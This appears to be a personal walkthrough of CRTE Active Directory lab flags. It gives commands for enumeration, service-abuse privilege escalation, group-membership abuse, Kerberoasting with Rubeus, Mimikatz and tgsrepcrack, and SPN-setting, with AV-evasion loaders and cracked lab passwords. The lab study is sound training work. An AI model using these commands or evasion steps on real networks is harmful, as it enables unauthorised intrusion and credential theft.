# CRTE Lab

## Flag 1,2 - Domain Enumeration

Enumerate following for the us.techcorp.local domain:

* Users&#x20;
* &#x20;Computers&#x20;
* &#x20;Domain Administrators&#x20;
* &#x20;Enterprise Administrators&#x20;
* &#x20;Kerberos Policy

Use BloodHound to do it or ad module

## Flag 3,4 - Trust Enumeration

To list only the external trusts using PowerView:

{% code overflow="wrap" %}
```powershell
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>

The trust is bidirectional, so enumerate the trust that eu.local has

```powershell
Get-ForestTrust -Forest eu.local
```

<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>

## FLAG 5/6/7 - Name of the service for privesc on local machine

* Exploit a service on studentx and elevate privileges to local administrator.
* Identify a machine in the domain where studentuserx has local administrative access due to group membership.

Use PowerUp to find a privesc

```powershell
Invoke-AllChecks
```

<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>

And exploit the service

```powershell
Invoke-ServiceAbuse -Name 'ALG' -UserName us\studentuser64
```

Now log off and log on to gain admin privileges

Import PowerView to find computer wjere we have access as Local Admin

```powershell
Find-LocalAdminAccess
```

Nothing but you can see from bloodhound that the group studentuser is enrolled in the Managers group

Managers group has generic all on MachineAdmins Group, so with AdModule we can add ourself to this group.

```powershell
Add-ADGroupMember -Identity MachineAdmins -Members studentuser64 -Verbose
```

<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>

Now relogin to update the permissions and try to access to us-mgmt

```powershell
winrs -r:us-mgmt whoami
```

<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>

By enumerating the groups which we belongs we can se that in the mgmt OU we are Administrators.

## Flag 8 - SevicePrincipalName of the user serviceaccount that we Kerberoasted

Using PowerView see if there are any SPN

{% code overflow="wrap" %}
```powershell
Get-DomainUser –SPN
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (5).png" alt=""><figcaption></figcaption></figure>

the kerberoast attack can be done in wto ways

#### Rubeus and John

First use Argspli.bat to avoid detection in the cmd

<figure><img src="../.gitbook/assets/immagine (6).png" alt=""><figcaption></figcaption></figure>

Now load Rubeus with the Loader to avoid detection and launch an attack against ServiceAccount

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (7).png" alt=""><figcaption></figcaption></figure>

Now crackit with john. The password is _Password123_

#### KerberosRequestorSecurityToken.NET class from PowerShell, Mimikatz and tgsrepcrack.py

We can also use the KerberosRequestorSecurityToken .NET class from PowerShell to request a ticket.

{% code overflow="wrap" %}
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (8).png" alt=""><figcaption></figcaption></figure>

Use Mimikatz to extract the ticket

```powershell
Invoke-Mimi -Command '"kerberos::list /export"'
```

<figure><img src="../.gitbook/assets/immagine (9).png" alt=""><figcaption></figcaption></figure>

and crack it

{% code overflow="wrap" %}
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-60210000-studentuser64@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
```
{% endcode %}

## Flag 9 - Password for supportXuser that we Kerberoasted&#x20;

With PowerView see if we have any other interesting ACL with studentusers group:

{% code overflow="wrap" %}
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (10).png" alt=""><figcaption></figcaption></figure>

Since studentuser64 has GenericAll rights on the support64user, let’s force set a SPN on it. Using ActiveDirectory module:

{% tabs %}
{% tab title="Powerview" %}
{% code overflow="wrap" %}
```
Set-DomainObject -Identity support64user -Set @{serviceprincipalname='us/myspn64'} -Verbose
```
{% endcode %}
{% endtab %}

{% tab title="Ad-Module" %}
{% code overflow="wrap" %}
```
Set-ADUser -Identity Support64User -ServicePrincipalNames @{Add='us/myspn64'} -Verbose
```
{% endcode %}
{% endtab %}
{% endtabs %}

Check if SPN is set up now

{% code overflow="wrap" %}
```powershell
Get-ADUser -Identity support64user -Properties ServicePrincipalName | select ServicePrincipalName
```
{% endcode %}

{% hint style="info" %}
If nothing showed might work the same
{% endhint %}

Now crack it. The password is _Desk@123_

## Flag 10 -  LAPS

